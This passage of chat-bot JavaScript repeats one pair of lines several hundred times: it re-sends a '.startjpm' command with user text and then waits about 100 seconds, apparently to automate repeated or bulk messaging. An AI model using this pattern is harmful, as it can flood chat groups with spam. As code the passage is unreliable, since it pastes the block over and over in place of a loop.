    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
        await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
        await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
        await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
        await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
